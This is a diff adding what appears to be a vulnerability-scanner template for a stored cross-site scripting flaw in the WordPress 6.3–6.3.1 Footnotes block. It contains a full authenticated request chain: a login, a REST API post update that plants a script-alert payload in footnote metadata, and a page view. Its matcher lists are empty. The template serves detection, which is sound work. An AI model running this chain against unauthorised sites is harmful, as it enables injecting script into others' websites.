@@ -1,0 +1,52 @@
+id: wp-footnote-xss
+brief:
+    title: WordPress 6.3-6.3.1 Footnotes Block - Cross-Site Scripting
+    by: nqdung2002
+    level: medium
+    about: WordPress does not escape some of its Footnotes block options before outputting them back in a page/post where the block is embed.
+    label:
+        - wpscan
+        - xss
+        - wp
+        - wordpress
+        - footnote
+        - xss
+        - authenticated
+        - vuln
+    score: CVSS:6.4
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+        Origin: '{{RootURL}}'
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/post-new.php'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/?rest_route=/wp/v2/posts/{{postid}}'
+      head:
+        Content-Type: application/json
+        X-HTTP-Method-Override: PUT
+        X-WP-Nonce: '{{nonce}}'
+      body: |-
+        {
+          "id": {{postid}},
+          "title": "Stored XSS via Footnote Block",
+          "content": "<!-- wp:paragraph -->\n<p>Test CVE<sup data-fn=\"testid\" class=\"fn\"><a href=\"#testid\" id=\"testid-link\">1</a></sup></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:footnotes /-->",
+          "meta": {
+            "footnotes": "[{\"content\":\"<script>alert(document.domain)</script>\",\"id\":\"testid\"}]"
+          },
+          "status": "pending"
+        }
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/?p={{postid}}'
+      signs: []
